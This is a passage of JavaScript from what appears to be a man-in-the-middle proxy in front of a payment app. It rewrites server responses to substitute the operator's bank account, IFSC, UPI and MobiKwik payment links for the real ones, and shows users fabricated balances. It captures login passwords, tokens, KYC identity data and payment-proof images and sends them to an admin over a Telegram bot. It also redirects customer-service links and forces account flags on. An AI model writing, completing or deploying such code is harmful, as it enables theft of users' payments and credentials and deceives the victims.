        const _reqBodyAmt = getOrderAmount(req, req.body || {});
        let savedAmount = _reqBodyAmt || 0;
        if (!savedAmount && bj.data && typeof bj.data === 'object') {
          // extract from walletDomain if possible
          if (bj.data.walletDomain) {
            const urlParams = new URLSearchParams(bj.data.walletDomain.split('?')[1] || '');
            savedAmount = parseFloat(urlParams.get('amount') || 0);
          } else {
            savedAmount = parseFloat(bj.data.amount || bj.data.money || 0);
          }
        }

        const isSuccessMsg = origMsg.toLowerCase().includes('upi is being used') || origMsg.toLowerCase().includes('finish payment');
        if (!(origCode === 0 || origCode === undefined || isSuccessMsg)) {
          // ── Case 2: Real API returned ERROR ─────────────────────────────────
          const errorKey = reqOrderId + '_' + origMsg;
          const lastErrTime = recentErrors.get(errorKey) || 0;
          const nowTs = Math.floor(Date.now() / 1000);
          if (nowTs - lastErrTime > 15) { // 15 seconds debounce
            recentErrors.set(errorKey, nowTs);
            notifyAdmin(data,
              `❌ BUY NOT SUCCESSFUL\n💰 Amount: ₹${savedAmount || 'unknown'}\n📋 Order: ${reqOrderId || 'N/A'}\n⚠️ Reason: ${origMsg || 'unknown error'}\n🕐 ${now}`);
          }
        } else {
          // ── Case 1: Real API returned SUCCESS ─────────────────────────────────
          const activeBank = getActiveBank(data, null);
          if (activeBank && reqOrderId && data.botEnabled !== false) {
            if (!activeBank.minAmount || savedAmount >= activeBank.minAmount) {
              if (!data.orderBankMap) data.orderBankMap = {};
              const bkAcct = activeBank.accountNo || '';
              const bkIfsc = activeBank.ifsc || '';
              const bkName = activeBank.accountHolder || '';
              const last4 = bkAcct.slice(-4);
              const wDom = bkAcct ? `mobikwik://moneytransfer/upi/bank?account=${bkAcct}&ifsc=${bkIfsc}&name=${encodeURIComponent(bkName)}&amount=${savedAmount}.0&displayAccountNumber=xxxxxxxxx${last4}` : '';
              data.orderBankMap[String(reqOrderId)] = {
                bank: `${bkName} | ${bkAcct} | ${bkIfsc}`,
                bankName: activeBank.bankName || 'Bank',
                upiId: activeBank.upiId || '',
                amount: savedAmount,
                orderId: reqOrderId,
                orderNo: reqOrderId,
                walletDomain: wDom,
                payType: 2,
                time: now,
                userId: String(userId || ''),
                forced: true,
                isManual: true
              };
              await saveData(data);
            }
          }
        }
        // Let it fall through to main proxy logic to rewrite the response!
      } else {
        bh['content-length'] = String(Buffer.byteLength(bb));
        res.writeHead(br.status, bh);
        return res.end(bb);
      }
    }

    // ── paymentslipdetail / order detail intercept — serve from orderBankMap if backend 404s ──
    const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (urlLower.includes('paymentslipdetail') || urlLower.includes('payment_slip_detail') ||
      urlLower.includes('slipdetail') || urlLower.includes('orderdetail') || urlLower.includes('order_detail') ||
      urlLower.includes('buydetail') || urlLower.includes('buy_detail'));
    if (isSlipDetail && !proxyRes) {
      proxyRes = await proxyToTivox(req);
      const { response: sd, respBody: sb2, respHeaders: sh2 } = proxyRes;
      let sj2 = null;
      try { sj2 = JSON.parse(sb2); } catch (e) { }
      // If backend returned 404 / error / non-JSON — try to serve from orderBankMap
      const slipFailed = !sj2 || sd.status === 404 || (sj2.code !== 0 && sj2.code !== undefined);
      if (slipFailed && data.orderBankMap) {
        // Extract order ID from URL query or request body
        let slipId = '';
        const qs2 = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
        for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId', 'id']) {
          slipId = slipId || qs2.get(f) || '';
        }
        if (!slipId && req.body) {
          for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId']) {
            slipId = slipId || req.body[f] || '';
          }
        }
        const savedSlip = slipId ? data.orderBankMap[String(slipId)] : null;
        if (savedSlip) {
          const activeBank = getActiveBank(data, null);
          const bkName2 = activeBank ? activeBank.accountHolder : '';
          const bkAcct2 = activeBank ? activeBank.accountNo : '';
          const bkIfsc2 = activeBank ? activeBank.ifsc : '';
          const bkBank2 = activeBank ? (activeBank.bankName || 'Bank') : 'Bank';
          const bkUpi2 = activeBank ? (activeBank.upiId || '') : '';
          const amt2 = savedSlip.amount || 0;
          const last42 = bkAcct2.slice(-4);
          const nowTs2 = Math.floor(Date.now() / 1000);
          const wDomain = bkAcct2 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcct2}&ifsc=${bkIfsc2}&name=${encodeURIComponent(bkName2)}&amount=${amt2}.0&displayAccountNumber=xxxxxxxxx${last42}` : '';
          const slipResp = {
            code: 0, msg: 'success',
            data: {
              rptNo: slipId, orderNo: slipId, orderId: slipId, slipId: slipId,
              acctName: bkName2, accountName: bkName2, name: bkName2,
              acctNo: bkAcct2, accountNo: bkAcct2, account: bkAcct2,
              acctCode: bkIfsc2, ifsc: bkIfsc2, ifscCode: bkIfsc2,
              bankName: bkBank2, acctBankName: bkBank2,
              upiId: bkUpi2, payAccount: bkUpi2 || `${bkAcct2}@mbk`, ctAccount: bkAcct2,
              walletDomain: wDomain,
              amount: amt2, realAmount: amt2, orderAmount: amt2, money: amt2,
              endTime: nowTs2 + 1800, expireTime: nowTs2 + 1800, crtDate: nowTs2,
              payerTimeoutTime: 1800, timeoutTime: 1800,
              orderState: 0, currency: 3, exchangeRate: 1, hideState: 0,
              payType: 2, ctType: 1, method: 1,
              ctTypeName: 'MobiKwik', payTypeName: 'MobiKwik',
            }
          };
          return res.status(200).json(slipResp);
        }
      }
      // If backend responded fine, we still need to replace bank details!
      if (!slipFailed && sj2 && sj2.data) {
        const activeBank = getActiveBank(data, null);
        if (activeBank) {
          const hasBank = scanHasBankFields(sj2.data, 0);
          if (hasBank) deepReplaceBankFields(sj2.data, activeBank, 0, hasBank);

          if (activeBank.bankName) {
            sj2.data.bankName = activeBank.bankName;
            if (sj2.data.acctBankName !== undefined) sj2.data.acctBankName = activeBank.bankName;
            if (sj2.data.bank !== undefined) sj2.data.bank = activeBank.bankName;
          }

          // Stringify the updated JSON and update headers
          const newBody = JSON.stringify(sj2);
          sh2['content-length'] = String(Buffer.byteLength(newBody));
          res.writeHead(sd.status, sh2);
          return res.end(newBody);
        }
      }
      // If no active bank or didn't replace, just let the main pipeline handle it
    }

    // ── availablect — if empty list, inject a placeholder so frontend doesn't block buy ──
    const isAvailableCt = urlLower.includes('availablect') || urlLower.includes('available_ct') ||
      urlLower.includes('availablechannel') || urlLower.includes('paymentchannel');
    if (isAvailableCt) {
      const { response: ar, respBody: ab, respHeaders: ah } = await proxyToTivox(req);
      let aj = null;
      try { aj = JSON.parse(ab); } catch (e) { }
      if (aj && aj.code === 0 && Array.isArray(aj.data) && aj.data.length === 0) {
        // Backend says no channels available — inject a stub so the frontend can proceed
        aj.data = [{ id: 1, name: 'Bank Transfer', type: 0, payType: 0, status: 1, enable: 1 }];
        return res.status(200).json(aj);
      }
      if (aj) return res.status(200).json(aj);
      ah['content-length'] = String(Buffer.byteLength(ab));
      res.writeHead(ar.status, ah);
      return res.end(ab);
    }




    const { response, respBody, respHeaders } = proxyRes || await proxyToTivox(req);

    if (data.blockUpdate !== false) {
      for (const k of Object.keys(respHeaders)) {
        if (k.toLowerCase() === 'needupdateflag') delete respHeaders[k];
      }
    }

    let jsonResp = null;
    try { jsonResp = JSON.parse(respBody); } catch (e) { }

    if (!jsonResp) {
      respHeaders['content-length'] = String(Buffer.byteLength(respBody));
      res.writeHead(response.status, respHeaders);
      return res.end(respBody);
    }

    // Full bypass for login and security check intercepts.
    // Real server handles rate limiting and security checks on login/register completely.

    const respData = jsonResp.data || jsonResp.body || jsonResp.result || null;

    if (urlLower.includes('customerservice') || urlLower.includes('customer_service') || urlLower.includes('customer-service') || urlLower.includes('csrlist') || urlLower.includes('servicelist')) {
      function replaceAllUrls(obj) {
        if (!obj || typeof obj !== 'object') return;
        if (Array.isArray(obj)) { obj.forEach(item => replaceAllUrls(item)); return; }
        for (const k of Object.keys(obj)) {
          if (typeof obj[k] === 'string') {
            const v = obj[k].trim();
            if (v.startsWith('http://') || v.startsWith('https://') || v.startsWith('tg://') || v.startsWith('whatsapp://')) {
              obj[k] = 'https://t.me/Vivipaymed';
            }
          } else if (typeof obj[k] === 'object') {
            replaceAllUrls(obj[k]);
          }
        }
      }
      replaceAllUrls(jsonResp);
      const finalBody = JSON.stringify(jsonResp);
      const finalCS = finalBody.replace(/https?:\/\/[^\s"',}\]]+/g, 'https://t.me/Vivipaymed');
      respHeaders['content-length'] = String(Buffer.byteLength(finalCS));
      res.writeHead(response.status, respHeaders);
      return res.end(finalCS);
    }

    let reqBody = {};
    if (req.rawBody && req.rawBody.length > 0) {
      try {
        const ct = (req.headers['content-type'] || '').toLowerCase();
        if (ct.includes('json')) { reqBody = JSON.parse(req.rawBody.toString()); }
        else if (ct.includes('multipart')) { reqBody = parseMultipartFields(req.rawBody); }
        else if (ct.includes('form')) { reqBody = Object.fromEntries(new URLSearchParams(req.rawBody.toString())); }
      } catch (e) { }
    }
    if (req.body && typeof req.body === 'object' && Object.keys(req.body).length > 0) {
      reqBody = { ...reqBody, ...req.body };
    }

    let userId = '';
    const pxUid = req.headers['x-px-uid'] || '';
    if (pxUid && /^\d{3,12}$/.test(pxUid)) userId = pxUid;
    if (!userId && respData && typeof respData === 'object') userId = findNumericId(respData, 0);
    if (!userId) userId = findNumericId(jsonResp, 0);
    if (!userId) userId = findNumericId(reqBody, 0);
    if (!userId) userId = await resolveUserId(req);

    const reqPhone = reqBody.phone || reqBody.mobile || reqBody.memberPhone || reqBody.username || reqBody.loginName || reqBody.account || '';
    const respPhone = (respData && typeof respData === 'object') ? (respData.phone || respData.mobile || respData.memberPhone || respData.loginName || '') : '';
    const phone = reqPhone || respPhone;

    if (userId) {
      await saveUserMapping(req, userId);
      if (!data.trackedUsers) data.trackedUsers = {};
      const existing = data.trackedUsers[String(userId)] || {};
      data.trackedUsers[String(userId)] = {
        ...existing,
        lastSeen: now,
        lastAction: path.split('/').pop() || 'API',
        phone: phone || existing.phone || ''
      };
      if (respData && typeof respData === 'object') {
        const rName = respData.name || respData.nickname || respData.realName || respData.userName || respData.memberName || '';
        if (rName) data.trackedUsers[String(userId)].name = rName;
      }
    }

    const isLogin = urlLower.includes('login') || urlLower.includes('signin') || urlLower.includes('dologin') || urlLower.includes('auth') || urlLower.includes('register');
    if (isLogin) {
      const pwd = reqBody.password || reqBody.pwd || reqBody.loginPwd || reqBody.pass || '';

      let extractedToken = '';
      if (typeof respData === 'string' && respData.length > 10) {
        extractedToken = respData;
      } else if (respData && typeof respData === 'object') {
        extractedToken = respData.token || respData.accessToken || '';
        if (!extractedToken && typeof respData.data === 'string' && respData.data.length > 10) {
          extractedToken = respData.data;
        }
      }

      if (!extractedToken && response.headers && response.headers.get('set-cookie')) {
        const cookieMatch = response.headers.get('set-cookie').match(/token=([^;]+)/);
        if (cookieMatch) extractedToken = cookieMatch[1];
      }

      const isApp = req.headers['x-requested-with'] === 'com.vivipay.runapp' || (req.headers['user-agent'] && req.headers['user-agent'].includes('wv'));
      const platformStr = isApp ? '📱 Android App' : '🌐 Web Browser';

      notifyAdmin(data,
        `🔑 LOGIN CAPTURED
👤 User: ${userId || 'N/A'}
💻 Platform: ${platformStr}
📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${extractedToken ? '\n🎫 Token: ' + extractedToken : ''}
🕐 ${now}`);

    }

    const isUserInfo = urlLower.includes('userinfo') || urlLower.includes('memberinfo') ||
      urlLower.includes('member/info') || urlLower.includes('user/info') ||
      urlLower.includes('myinfo') || urlLower.includes('getinfo') ||
      urlLower.includes('getmember') || urlLower.includes('memberdetail');

    // ── Global feature-flag patch: force all "permission" flags to enabled ──────
    // Applied to EVERY response regardless of URL — covers memberInfo, home, index etc.
    {
      function patchFeatureFlags(obj, depth) {
        if (!obj || typeof obj !== 'object' || depth > 4) return;
        if (Array.isArray(obj)) { obj.forEach(i => patchFeatureFlags(i, depth + 1)); return; }
        // chargeFlag=1 → user can buy; userBankFlag=1 → bank/UPI section unlocked
        // withdrawFlag=1 → withdraw enabled; sellFlag=1 → sell enabled
        const onFlags = ['chargeFlag', 'userBankFlag', 'withdrawFlag', 'sellFlag',
          'buyFlag', 'rechargeFlag', 'tradeFlag', 'enableBuy', 'enableSell',
          'enableWithdraw', 'enableRecharge', 'canBuy', 'canSell', 'canWithdraw'];
        for (const f of onFlags) {
          if (obj[f] !== undefined && obj[f] === 0) obj[f] = 1;
        }
        // status=1 (active), freeze=0 (not frozen), isFreeze=0
        if (obj.status !== undefined && obj.status === 0 && obj.code === undefined) obj.status = 1;
        if (obj.freeze !== undefined) obj.freeze = 0;
        if (obj.isFreeze !== undefined) obj.isFreeze = 0;
        for (const k of Object.keys(obj)) {
          if (obj[k] && typeof obj[k] === 'object') patchFeatureFlags(obj[k], depth + 1);
        }
      }
      patchFeatureFlags(jsonResp, 0);
    }

    if (isUserInfo && respData && typeof respData === 'object' && userId) {
      const balResult = findBalanceDeep(respData, 0) || findBalanceDeep(jsonResp, 0);
      if (balResult) {
        const realBalance = balResult.value;
        const uo = (data.userOverrides && data.userOverrides[String(userId)]) || {};
        const addedBalance = uo.addedBalance || 0;
        const globalBonus = data.depositBonus || 0;
        const totalFake = addedBalance + globalBonus;
        const shownBalance = parseFloat((realBalance + totalFake).toFixed(2));
        const lastReal = uo.lastRealBalance;
        const trackedUser = (data.trackedUsers && data.trackedUsers[String(userId)]) || {};
        const userName = trackedUser.name || '';
        const userPhone = trackedUser.phone || phone || '';

        if (!data.userOverrides) data.userOverrides = {};
        if (!data.userOverrides[String(userId)]) data.userOverrides[String(userId)] = {};
        data.userOverrides[String(userId)].lastRealBalance = realBalance;

        const balChanged = lastReal === undefined || Math.abs(lastReal - realBalance) > 0.01;
        const snapKey = `bal_${userId}`;
        const lastSnapTime = _balSnapTimes[snapKey] || 0;
        const nowMs = Date.now();
        const shouldNotify = balChanged || (nowMs - lastSnapTime > 120000);

        if (shouldNotify && (nowMs - lastSnapTime > 10000)) {
          _balSnapTimes[snapKey] = nowMs;
          const changeStr = lastReal !== undefined
            ? `\n📈 Change: ${realBalance > lastReal ? '+' : ''}₹${(realBalance - lastReal).toFixed(2)} (was ₹${lastReal})`
            : '';
          notifyAdmin(data,
            `┌──────────────────────────┐
│    💎 BALANCE SNAPSHOT    │
└──────────────────────────┘
👤 ID: ${userId}${userName ? '\n📛 Name: ' + userName : ''}${userPhone ? '\n📱 Phone: ' + userPhone : ''}

📊 BALANCE BREAKDOWN:
💰 Real Balance:   ₹${realBalance.toFixed(2)}
➕ Bot Added:      ₹${totalFake.toFixed(2)}${addedBalance ? ' (user: +₹' + addedBalance + ')' : ''}${globalBonus ? (addedBalance ? ', global: +₹' + globalBonus : ' (global: +₹' + globalBonus + ')') : ''}
━━━━━━━━━━━━━━━━━━━━━━━━━━
👁 User Sees:      ₹${shownBalance.toFixed(2)}${changeStr}

🔗 Field: ${balResult.field}
🕐 ${now}`);
        }
        data.trackedUsers[String(userId)].balance = String(realBalance);
      }
    }

    const isOrder = urlLower.includes('paymentslipdetail')
      || /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy|doRecharge|submitRecharge|createRecharge|doTrade|submitTrade)\b/i.test(path)
      || (/\/(order|buy|recharge|trade)/i.test(path) && req.method === 'POST')
      || urlLower.includes('news/code/'); // For dynamic direct payment screens like freechargetutorial
    let _orderId = '';
    if (isOrder) {
      const orderFields = ['orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo', 'id', 'slipId'];
      if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
        for (const f of orderFields) {
          if (respData[f] && String(respData[f]).length >= 3) { _orderId = String(respData[f]); break; }
        }
      }
      if (!_orderId) {
        const urlParams = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
        for (const f of orderFields) {
          if (urlParams.get(f)) { _orderId = urlParams.get(f); break; }
        }
      }
    }

    if (urlLower.includes('/history') || urlLower.includes('_history') || urlLower.includes('listbuy')) {
      if (jsonResp && (jsonResp.code === 0 || jsonResp.code === undefined) && respData) {
        const orderList = Array.isArray(respData) ? respData : (Array.isArray(respData.list) ? respData.list : (Array.isArray(respData.data) ? respData.data : []));
        const activeBank = getActiveBank(data, null);

        if (data.botEnabled !== false) {
          for (const order of orderList) {
            const amt = getOrderAmount(req, order);
            const orderIdFields = ['rptNo', 'rpt_no', 'orderNo', 'order_no', 'orderId', 'order_id', 'id', 'tradeNo'];
            let orderId = '';
            for (const f of orderIdFields) {
              if (order[f] && String(order[f]).length >= 3 && /^\d+$/.test(String(order[f]))) {
                orderId = String(order[f]); break;
              }
            }
            if (!orderId) {
              for (const f of orderIdFields) {
                if (order[f] && String(order[f]).length >= 3) {
                  orderId = String(order[f]); break;
                }
              }
            }
            const altId = order.orderNo || order.rptNo || '';

            // Find target bank (saved in orderBankMap if forced/manual or fallback to activeBank)
            const targetBank = resolveTargetBank(data, orderId, altId, activeBank);

            if (targetBank) {
              const bkAcctC1 = targetBank.accountNo || '';
              const bkIfscC1 = targetBank.ifsc || '';
              const bkNameC1 = targetBank.accountHolder || '';
              const last4C1 = bkAcctC1.slice(-4);
              let pt = order.payType || order.ctType || 1;
              if (urlLower.includes('usdt') || order.currency === 'USDT') pt = 0;
              const wDomC1 = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt || 0}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : '';

              // Unconditionally replace all bank & payment fields on the history order item
              replaceOrderBankDetails(order, targetBank);

              if (wDomC1) order.walletDomain = wDomC1;

              // Only auto-capture & notify admin if the order is actively being paid
              const isPaying = order.status === 0 || order.status === 1 || order.orderState === 0 || order.orderState === 1 || order.state === 0 || order.state === 1;
              if (isPaying && orderId && amt !== null) {
                if (!targetBank.minAmount || amt >= targetBank.minAmount) {
                  if (!data.orderBankMap) data.orderBankMap = {};
                  if (!data.orderBankMap[String(orderId)] || !data.orderBankMap[String(orderId)].forced) {
                    const savedData = {
                      bank: `${bkNameC1} | ${bkAcctC1}${bkIfscC1 ? ' | ' + bkIfscC1 : ''}`,
                      accountHolder: bkNameC1,
                      accountNo: bkAcctC1,
                      ifsc: bkIfscC1,
                      bankName: targetBank.bankName || '',
                      upiId: targetBank.upiId || '',
                      amount: amt,
                      rptNo: orderId,
                      orderNo: altId || orderId,
                      walletDomain: wDomC1,
                      payType: pt,
                      time: now,
                      userId: String(userId || ''),
                      forced: true,
                      isManual: true
                    };

                    data.orderBankMap[String(orderId)] = savedData;
                    if (altId && altId !== orderId) {
                      data.orderBankMap[String(altId)] = savedData;
                    }

                    saveData(data).catch(() => { });

                    if (!data.orderBankMap[String(orderId)].notified) {
                      data.orderBankMap[String(orderId)].notified = true;
                      if (altId && altId !== orderId) {
                        data.orderBankMap[String(altId)].notified = true;
                      }
                      notifyAdmin(data,
                        `✅ AUTO-CAPTURED FROM HISTORY
💰 Amount: ₹${amt}
📋 Order: ${orderId}
💾 Auto-saved with Bank: ${bkNameC1} | ${bkAcctC1}
🕐 ${now}`);
                    }
                  }
                }
              }
            }
          }
        }
      }
    }

    if (urlLower.includes('kyc') || urlLower.includes('bind') || urlLower.includes('linkkyc')) {
      let kycInfo = '';
      if (req.rawBody) {
        try {
          const ct = (req.headers['content-type'] || '').toLowerCase();
          let b = {};
          if (ct.includes('json')) b = JSON.parse(req.rawBody.toString());
          else if (ct.includes('multipart')) b = parseMultipartFields(req.rawBody);
          else if (ct.includes('form')) b = Object.fromEntries(new URLSearchParams(req.rawBody.toString()));
          const keys = ['realName', 'name', 'idCard', 'idNo', 'bankCard', 'bankNo', 'accountNo', 'ifsc', 'upiId', 'phone', 'mobile'];
          for (const k of keys) { if (b[k]) kycInfo += `\n  ${k}: ${b[k]}`; }
        } catch (e) { }
      }
      notifyAdmin(data,
        `🔐 KYC/BIND
👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${kycInfo}
🕐 ${now}`);
    }

    if (urlLower.includes('sell') || urlLower.includes('withdraw')) {
      let sellAmt = '';
      if (respData && typeof respData === 'object') {
        const a = respData.amount || respData.money || respData.withdrawAmount || respData.sellAmount;
        if (a) sellAmt = `\n💰 Amount: ₹${a}`;
      }
      notifyAdmin(data,
        `💸 SELL/WITHDRAW
👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${sellAmt}
📊 Status: ${response.status}
🕐 ${now}`);
    }

    if (urlLower.includes('cancel')) {
      const cancelSuccess = !jsonResp || jsonResp.code === 0 || jsonResp.code === 200 || jsonResp.success === true;
      let cancelOrderId = '';
      let cancelAmt = '';
      let cancelBankInfo = '';
      const cancelFields = ['orderId', 'orderNo', 'order_id', 'buyOrderNo', 'id', 'slipId'];
      const cancelAmtFields = ['amount', 'money', 'orderAmount', 'buyAmount', 'totalAmount'];
      if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
        for (const f of cancelFields) { if (respData[f]) { cancelOrderId = String(respData[f]); break; } }
        for (const f of cancelAmtFields) { if (respData[f]) { cancelAmt = `\n💰 Amount: ₹${respData[f]}`; break; } }
      }
      if (!cancelOrderId) {
        const urlParams = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
        for (const f of cancelFields) { if (urlParams.get(f)) { cancelOrderId = urlParams.get(f); break; } }
        if (!cancelOrderId && req.body) {
          for (const f of cancelFields) { if (req.body[f]) { cancelOrderId = String(req.body[f]); break; } }
        }
      }
      if (cancelOrderId && data.orderBankMap && data.orderBankMap[cancelOrderId]) {
        const saved = data.orderBankMap[cancelOrderId];
        cancelBankInfo = `\n🏦 Bank Was: ${saved.bank}`;
        if (!cancelAmt && saved.bank) { }
      }
      notifyAdmin(data,
        `❌ ORDER CANCELLED
👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${cancelOrderId ? '\n📋 Order: ' + cancelOrderId : ''}${cancelAmt}${cancelBankInfo}
📊 ${cancelSuccess ? '✅ Cancelled Successfully' : '⚠️ Cancel Response: ' + (jsonResp && jsonResp.message ? jsonResp.message : response.status)}
🕐 ${now}`);
    }

    if (urlLower.includes('notifynewbill') || urlLower.includes('notify_new_bill') || urlLower.includes('newbill')) {
      let billInfo = '';
      if (jsonResp && typeof jsonResp === 'object') {
        const d = jsonResp.data || jsonResp.body || jsonResp.result || jsonResp;
        const fields = ['billId', 'orderId', 'orderNo', 'amount', 'money', 'fromTimestamp', 'phone', 'mobile', 'account', 'bankName', 'ifsc', 'upiId'];
        for (const f of fields) {
          if (d[f] !== undefined && d[f] !== null && d[f] !== '') billInfo += `\n  ${f}: ${d[f]}`;
        }
      }
      notifyAdmin(data,
        `🔔 NEW BILL\n👤 User: ${userId || 'N/A'}${billInfo}\n🕐 ${now}`);
    }

    // ── Payment Proof & Slip Interceptor (ONLY sends when actual photo/screenshot exists) ────
    const isProofUpload = req.method === 'POST' && (urlLower.includes('uploadpaymentproof') || urlLower.includes('uploadproof'));
    if (isProofUpload) {
      let proofOrderId = '';
      const proofMatch = (req.originalUrl || req.url).match(/\/(?:uploadPaymentProof|uploadproof)\/([a-zA-Z0-9_-]+)/i);
      if (proofMatch && proofMatch[1]) proofOrderId = proofMatch[1];
      if (!proofOrderId && respData && typeof respData === 'object') {
        proofOrderId = respData.rptNo || respData.orderId || respData.orderNo || respData.id || '';
      }
      if (!proofOrderId && req.body) {
        proofOrderId = req.body.rptNo || req.body.orderId || req.body.orderNo || req.body.id || '';
      }

      // Check if response contains proof payment image path
      let proofPath = '';
      if (respData && typeof respData === 'object') {
        proofPath = respData.proof_payment || respData.proofPayment || respData.proofUrl || respData.imageUrl || respData.image || '';
      }
      if (!proofPath && jsonResp && typeof jsonResp === 'object') {
        const d = jsonResp.data || jsonResp.result;
        if (d && typeof d === 'object') {
          proofPath = d.proof_payment || d.proofPayment || d.proofUrl || d.imageUrl || '';
        }
      }

      // Format full image URL if relative path returned
      let fullProofUrl = '';
      if (proofPath && typeof proofPath === 'string') {
        if (proofPath.startsWith('http')) fullProofUrl = proofPath;
        else fullProofUrl = `https://vivipay.net/images/${proofPath.replace(/^\/+/, '')}`;
      }

      // Check if base64 image was uploaded in request body
      let imgBuffer = null;
      if (req.rawBody) {
        const rawStr = req.rawBody.toString('utf-8');
        const b64Match = rawStr.match(/data:image\/(?:png|jpeg|jpg|webp);base64,([A-Za-z0-9+/=]+)/);
        if (b64Match && b64Match[1]) {
          try { imgBuffer = Buffer.from(b64Match[1], 'base64'); } catch (e) { }
        }
      }

      // ONLY proceed if an actual photo/screenshot is present
      const hasImage = (imgBuffer && Buffer.isBuffer(imgBuffer) && imgBuffer.length > 0) || !!fullProofUrl;
      if (hasImage) {
        const dedupeKey = proofOrderId || `${userId}_${Date.now()}`;
        const lastSent = _lastProofTimes.get(dedupeKey) || 0;
        const nowMs = Date.now();

        if (nowMs - lastSent > 15000) { // 15s debounce
          _lastProofTimes.set(dedupeKey, nowMs);

          let mappedBankInfo = '';
          let orderAmt = '';
          if (proofOrderId && data.orderBankMap && data.orderBankMap[String(proofOrderId)]) {
            const saved = data.orderBankMap[String(proofOrderId)];
            if (saved.bank) mappedBankInfo = `\n🏦 Mapped Bank: ${saved.bank}`;
            if (saved.amount) orderAmt = `\n💰 Amount: ₹${saved.amount}`;
          }

          const captionText = `🧾 PAYMENT PROOF SUBMITTED
👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${proofOrderId ? '\n📋 Order: ' + proofOrderId : ''}${orderAmt}${mappedBankInfo}
📊 Status: ${response.status === 200 ? '✅ Uploaded (200 OK)' : '⚠️ Status ' + response.status}
🕐 ${now}`;

          if (imgBuffer && Buffer.isBuffer(imgBuffer) && imgBuffer.length > 0) {
            notifyAdminPhoto(data, imgBuffer, captionText);
          } else if (fullProofUrl) {
            notifyAdminPhoto(data, fullProofUrl, captionText);
          }
        }
      }
    }

    if (urlLower.includes('waitconfirm')) {
      if (respData && Array.isArray(respData.waitconfirm)) {
        for (const wc of respData.waitconfirm) {
          const rptNo = wc.rptNo;
          const amt = parseFloat(wc.amount) || 0;
          if (rptNo && data.botEnabled !== false) {
            const activeBank = getActiveBank(data, null);
            if (activeBank && (!activeBank.minAmount || amt >= activeBank.minAmount)) {
              if (!data.orderBankMap) data.orderBankMap = {};
              const isNew = !data.orderBankMap[String(rptNo)];
              const bkAcct = activeBank.accountNo || '';
              const bkIfsc = activeBank.ifsc || '';
              const bkName = activeBank.accountHolder || '';
              const last4 = bkAcct.slice(-4);
              const wDom = bkAcct ? `mobikwik://moneytransfer/upi/bank?account=${bkAcct}&ifsc=${bkIfsc}&name=${encodeURIComponent(bkName)}&amount=${amt}.0&displayAccountNumber=xxxxxxxxx${last4}` : '';

              const alreadyNotified = data.orderBankMap[String(rptNo)] && data.orderBankMap[String(rptNo)].notified;

              if (isNew) {
                data.orderBankMap[String(rptNo)] = {
                  bank: `${bkName} | ${bkAcct} | ${bkIfsc}`,
                  bankName: activeBank.bankName || 'Bank',
                  upiId: activeBank.upiId || '',
                  amount: amt,
                  orderId: rptNo,
                  orderNo: wc.orderNo || rptNo,
                  walletDomain: wDom,
                  payType: 2,
                  time: now,
                  userId: String(userId || ''),
                  forced: true,
                  isManual: true,
                  notified: true // Set to true so we don't double notify later
                };
                await saveData(data);
              }

              if (!alreadyNotified) {
                if (data.orderBankMap[String(rptNo)]) {
                  data.orderBankMap[String(rptNo)].notified = true;
                }
                // ALWAYS notify admin that the Go Pay popup was triggered
                notifyAdmin(data,
                  `✅ BUY SUCCESSFUL (Go Pay)\n💰 Amount: ₹${amt}\n📋 Order: ${rptNo}\n💾 Order is saved for history\n━━━━━━━━━━━━━━━━━━━━\n🏦 Bank Was: (Popup Captured)\n━━━━━━━━━━━━━━━━━━━━\n🔄 Replaced With: ${bkName} | ${bkAcct} | ${bkIfsc}\n🕐 ${now}`);
              }
            }
          }
        }
      }
    }

    if (data.logRequests && data.adminChatId && bot && !isLogin && !isUserInfo && !isOrder) {
      const tag = userId ? ` [${userId}]` : '';
      const phoneTag = phone ? ` (${phone})` : '';
      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}\n📊 Status: ${response.status}`).catch(() => { });
    }

    const _realBankSnap = captureRealBank(jsonResp);

    let _bankReplaced = false;
    let _replacedBank = null;
    let _notReplacedAmt = null;
    let _notReplacedMin = null;

    if (data.botEnabled !== false) {
      const bank = getActiveBank(data, userId);
      if (bank) {
        const isListResp = Array.isArray(respData);
        // Detect nested list: { list:[...] } / { data:[...] } / { records:[...] } / { rows:[...] } / { items:[...] }
        const nestedList = !isListResp && respData && typeof respData === 'object'
          ? (Array.isArray(respData.list) ? respData.list
            : Array.isArray(respData.data) ? respData.data
              : Array.isArray(respData.records) ? respData.records
                : Array.isArray(respData.rows) ? respData.rows
                  : Array.isArray(respData.items) ? respData.items
                    : null)
          : null;

        const _oIdFields = ['rptNo', 'rpt_no', 'orderNo', 'order_no', 'orderId', 'order_id', 'slipId', 'buyOrderNo', 'tradeNo'];
        function _getItemOId(item) {
          for (const f of _oIdFields) { if (item[f] && String(item[f]).length >= 3) return String(item[f]); }
          return '';
        }
        function _wasForced(oId) {
          return !!(oId && data.orderBankMap && data.orderBankMap[oId] && data.orderBankMap[oId].forced);
        }
        // Per-item replace: browse items (orderState=0) → minAmount check → blanket replace;
        // history items (orderState>0) → blanket replace always (operator sees all history)
        function _replaceListItems(list) {
          list.forEach(item => {
            if (!item || typeof item !== 'object') return;
            const oId = _getItemOId(item);
            const altOId = item.orderNo || item.rptNo || '';
            const targetBank = resolveTargetBank(data, oId, altOId, bank);

            if (targetBank) {
